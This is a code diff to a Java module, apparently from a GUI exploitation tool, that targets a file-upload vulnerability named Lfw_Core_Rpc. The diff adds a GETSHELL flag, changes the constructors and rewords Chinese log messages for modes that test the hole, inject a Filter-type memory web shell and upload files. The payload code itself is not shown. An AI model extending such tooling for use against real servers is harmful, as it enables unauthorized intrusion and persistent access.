@@ -14,11 +14,13 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
     public static boolean JNDI = false;
     public static boolean EXEC = false;
     public static boolean UPLOAD = true;
+    public static boolean GETSHELL = true;
 
-    public Lfw_Core_Rpc_Upload(TextArea log, TextArea execLog, TextArea uploadLog) {
-        this.log = log;
-        this.execLog = execLog;
-        this.uploadLog = uploadLog;
+    public Lfw_Core_Rpc_Upload() {
+    }
+
+    public Lfw_Core_Rpc_Upload(TextArea log, TextArea uploadLog, TextArea execLog) {
+        super(log, uploadLog, execLog);
     }
 
     @Override
@@ -94,7 +96,7 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
 
                 if (responseCode2 == HttpURLConnection.HTTP_OK) {
                     if (response2.contains(flag) && Config.MOD.equals("poc")) {
-                        logMessage("[+] 漏洞存在! 成功上传测试文件: " + fileUrl);
+                        logMessage("[+] Lfw_Core_Rpc 文件上传漏洞存在! 成功上传测试文件: " + fileUrl);
                     } else if (response2.contains(flag) && Config.MOD.equals("exp")) {
                         logMessage("[+] Filter 类型内存马注入成功, 请手动连接验证.");
                     } else if (Config.MOD.equals("upload")) {
@@ -102,7 +104,7 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
                     }
                 } else {
                     if (Config.MOD.equals("poc")) {
-                        logMessage("[-] 文件上传失败, 请手动验证漏洞.");
+                        logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请尝试手动验证漏洞.");
                     } else if (Config.MOD.equals("exp")) {
                         logMessage("[-] 内存马注入失败, 请手动验证漏洞.");
                     } else if (Config.MOD.equals("upload")) {
@@ -114,7 +116,7 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
             conn1.disconnect();
         } catch (Exception e) {
             if (Config.MOD.equals("poc") || Config.MOD.equals("exp")) {
-                logMessage("[-] 文件上传失败, 请手动验证漏洞.");
+                logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请手动验证漏洞.");
             } else if (Config.MOD.equals("upload")) {
                 logUpload("[-] 文件上传失败, 请手动验证漏洞.");
             }
